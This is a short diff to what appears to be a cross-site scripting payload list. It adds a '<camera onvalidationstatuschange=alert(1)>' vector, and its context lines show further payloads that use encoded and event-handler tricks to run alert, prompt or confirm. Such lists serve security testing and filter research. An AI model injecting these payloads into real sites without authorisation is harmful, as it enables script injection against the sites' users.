@@ -66,6 +66,7 @@ Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
 
  <img/src/onerror=prompt(8)>
 
+<camera onvalidationstatuschange=alert(1)>
 
  \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7
 
